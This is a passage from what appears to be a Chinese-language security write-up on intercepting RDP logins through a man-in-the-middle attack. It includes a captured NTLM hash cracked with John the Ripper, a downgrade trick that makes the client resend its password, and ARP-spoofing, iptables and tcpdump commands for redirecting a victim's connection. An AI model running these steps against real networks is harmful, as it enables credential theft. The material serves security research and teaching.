    000000D0: 8A 00 00 00 00 02 00 08 00 52 00 44 00 31 00 34 .........R.D.1.4
    000000E0: 00 01 00 08 00 44 00 43 00 30 00 31 00 04 00 14 .....D.C.0.1....
    000000F0: 00 72 00 64 00 31 00 34 00 2E 00 6C 00 6F 00 63 .r.d.1.4...l.o.c
    00000100: 00 61 00 6C 00 03 00 1E 00 64 00 63 00 30 00 31 .a.l.....d.c.0.1
    00000110: 00 2E 00 72 00 64 00 31 00 34 00 2E 00 6C 00 6F ...r.d.1.4...l.o
    00000120: 00 63 00 61 00 6C 00 05 00 14 00 72 00 64 00 31 .c.a.l.....r.d.1
    00000130: 00 34 00 2E 00 6C 00 6F 00 63 00 61 00 6C 00 07 .4...l.o.c.a.l..
    00000140: 00 08 00 D5 FD A8 7C EC 95 D2 01 06 00 04 00 02 ......|.........
    00000150: 00 00 00 08 00 30 00 30 00 00 00 00 00 00 00 00 .....0.0........
    00000160: 00 00 00 00 20 00 00 4C FA 6E 96 10 9B D9 0F 6A .... ..L.n.....j
    00000170: 40 80 DA AA 8E 26 4E 4E BF AF FA E9 E3 68 AF 78 @....&NN.....h.x
    00000180: 7F 53 E3 89 D9 6B 18 0A 00 10 00 00 00 00 00 00 .S...k..........
    00000190: 00 00 00 00 00 00 00 00 00 00 00 09 00 2C 00 54 .............,.T
    000001A0: 00 45 00 52 00 4D 00 53 00 52 00 56 00 2F 00 31 .E.R.M.S.R.V./.1
    000001B0: 00 39 00 32 00 2E 00 31 00 36 00 38 00 2E 00 34 .9.2...1.6.8...4
    000001C0: 00 30 00 2E 00 31 00 37 00 39 00 00 00 00 00 00 .0...1.7.9......
    000001D0: 00 00 00 00 00 00 00 19 0A F7 ED 0C 45 C0 80 73 ............E..s
    000001E0: 53 74 1A AB AF 13 B4 A3 81 9F 04 81 9C 01 00 00 St..............
    000001F0: 00 7F 38 FE A6 32 5E 4E 57 00 00 00 00 42 B4 6E ..8..2^NW....B.n
    00000200: 39 09 AA CC 8F 04 71 5C 54 CF AD E0 A0 58 AA 06 9.....qT....X..
    00000210: B2 F0 0A 33 05 03 54 60 FB E1 68 FC F5 0D A9 C0 ...3..T`..h.....
    00000220: D9 57 BA 43 F2 92 F7 6F 32 74 4E 86 CD 7F F0 3B .W.C...o2tN....;
    00000230: DD A4 A4 67 0A B7 7E 64 0B 63 D7 4B F7 C6 B7 8F ...g..~d.c.K....
    00000240: 21 15 9D EA 3E E1 1A 50 AB AA D3 6E 46 9D 68 6E !...>..P...nF.hn
    00000250: 2A EA 44 5C E0 51 1D 41 B4 13 EB B9 90 E8 75 AD *.D.Q.A......u.
    00000260: A0 99 4E F2 A5 99 D4 8D 2A 11 73 F1 95 FC 7E A0 ..N.....*.s...~.
    00000270: 06 FD 13 DB D0 3B 7A B4 41 97 B6 94 D4 11 62 F5 .....;z.A.....b.
    00000280: 4C 06 BE 03 9C 0F 55 0E 3C L.....U.&lt;
我高亮显示了客户端质询和NTLM的应答，两者是彼此相邻的。服务器质询位于服务器的上一条消息中。
我们在这里看到的是NTLM身份验证[15]。这是一种质询-应答技术，其中客户端会将服务器质询（类似于Server
Random）、客户端质询以及用户密码的哈希值以及一些其他值映射为加密哈希值。这个值称为“NTLM应答”，然后将其传输到服务器。
这个值的计算细节对我们来说并不重要。我们唯一需要知道的是，它不能用于重放攻击或用于哈希值传递攻击。但它可能会遭受密码猜测攻击！
底层的哈希算法是HMAC-MD5，这是一个相当差劲的哈希算法（所以我们可以每秒猜测大量值），但它仍然使用了salt（用来对付彩虹表）。
我们现在可以尝试用Hashcat [17]或者John Ripper [18]来破解它。John的哈希格式为[16]：
    :::::
在本例中，我们有：
    User1::RD14:a5f46f6489dc654f:110d658e927f077b0402040cc1a6b6ef:0101000000000
    000d5fda87cec95d201a7559d44f431848a0000000002000800520044003100340001000800
    44004300300031000400140072006400310034002e006c006f00630061006c0003001e00640
    06300300031002e0072006400310034002e006c006f00630061006c00050014007200640031
    0034002e006c006f00630061006c0007000800d5fda87cec95d201060004000200000008003
    000300000000000000000000000002000004cfa6e96109bd90f6a4080daaa8e264e4ebfaffa
    e9e368af787f53e389d96b180a0010000000000000000000000000000000000009002c00540
    0450052004d005300520056002f003100390032002e003100360038002e00340030002e0031
    0037003900000000000000000000000000
如果我们把这个哈希值放在一个名为hashes.txt的文件中，那么可以通过下列命令来进行验证：
    $ echo 'S00perS3cretPa$$word' | ./john --format=netntlmv2 --stdin hashes.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
    Will run 8 OpenMP threads
    Press Ctrl-C to abort, or send SIGUSR1 to john process for status
    S00perS3cretPa$$word (User1)
    1g 0:00:00:00 33.33g/s 33.33p/s 33.33c/s 33.33C/s S00perS3cretPa$$word
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
虽然不是很理想，但是总比什么都没有强。不过，实际上我们可以做得更好。
我们需要问自己的问题是：服务器是如何验证NTLM应答的？它会咨询域控制器。那么，如果域控制器不可用呢？
它会说“算了，让我们使用增强型RDP安全协议吧，不用NLA了”，客户端也会言听计从。但是有趣的是：由于客户端已经缓存了用户的密码，所以它会直接传输它，而不是将用户引导至Windows登录屏幕！
这正是我们想要的。这样除了SSL警告之外，就没有任何可疑的东西引起受害者的注意了。
所以，我们要做的事情是：当客户端发送它的NTLM应答后，我们将服务器的响应替换为：
    00000000: 300d a003 0201 04a4 0602 04c0 0000 5e 0.............^
我没有找到与此有关的文档，但它的确是无法联系域控制器时的服务器响应。客户端将返回到增强型RDP安全协议，并显示SSL警告，同时将SSL隧道内的密码传输到服务器。
请注意，我们没有收到SSL警告。根据规范[19]，客户端将SSL证书的指纹发送到使用由CredSSP协议协商的密钥加密的服务器。
如果它与服务器证书的指纹不匹配，那么会话将会被终止。这就是为什么即使受害者提供不正确的凭据也不要紧的原因—— 我们可以看到（不正确的）密码。
但是，如果密码正确，我们将观察到一个TLS内部错误。
我想出的解决方法是直接篡改NTLM应答。我对Python脚本进行了相应的修改，通过更改NTLM应答让NTLM身份验证总是失败。不过，受害者是不会注意到这一点的，因为正如我们刚才看到的，我们可以将连接降级到TLS，这样会重新传输凭据。
但是，还有一件事需要注意。如果客户端会显示正在尝试连接一台加入域的计算机，那么它就不会使用NTLM，而是使用Kerberos，这意味着它将在建立RDP连接之前与域控制器联系以请求相应的ticket。这是一件好事，因为Kerberos的ticket对攻击者而言，要比没有“盐化”的NTLM应答更加微不足道。但是，如果攻击者处于MitM位置，那么他就可以阻止针对Kerberos服务的所有请求。如果客户端无法联系Kerberos服务，那会发生什么呢？实际上，它会退回到NTLM。
将这种攻击技术武器化
到目前为止，我们一直在实验室环境下进行的。所以，受害者在RDP客户端中输入的不是我们的IP，而是他们自己的服务器的IP或主机名。有多种方法可以让我们成为中间人，但在这里我们将利用ARP欺骗。这种方法并不难，过一会儿就给出一个概念证明式的演示。由于这种攻击是在网络协议的第二层进行的，所以要求我们必须与受害者在同一个子网中。
在我们欺骗ARP回复并启用IPv4流量转发后，受害者和网关之间的所有通信都将通过我们的计算机。由于仍然不知道受害者输入的IP地址，所以仍然无法运行我们的Python脚本。
首先，我们创建一个iptables规则，丢弃受害者用于RDP服务器的SYN数据包：
    $ iptables -A FORWARD -p tcp -s "$VICTIM_IP" --syn --dport 3389 -j REJECT
我们不想重定向其他任何流量，因为受害者可能正在使用已建立的RDP连接，否则就会发生中断。如果我们这里不丢弃那些数据包的话，受害者就会与真正的主机建立连接，而我们则想让受害者与我们建立连接。
第二，我们等待来自受害者目的地端口为3389的TCP SYN分组，以便掌握原始目的地主机的地址。为此，我们可以使用tcpdump：
    $ tcpdump -n -c 1 -i "$IFACE" src host "$VICTIM_IP" and 
    "tcp[tcpflags] & tcp-syn != 0" and 
    dst port 3389 2> /dev/null | 
    sed -e 's/.*> ([0-9.]*).3389:.*/1/'
选项-c 1告诉tcpdump在第一个匹配数据包之后退出。这个SYN包将被丢弃，但这并不重要，因为受害者的系统很快就会再次尝试发送。
第三，我们将检索RDP服务器的SSL证书，并创建一个与原始证书具有相同公用名的新的自签名证书。我们还可以修正证书的到期日期，除非您对其指纹进行长时间的细致检查，否则它与原始文件很难区分。为此，我编写了一个小型的Bash脚本[23]来处理这项工作。
现在我们删除前面的iptables规则，并将受害者发送给RDP主机的TCP流量重定向到我们的IP地址：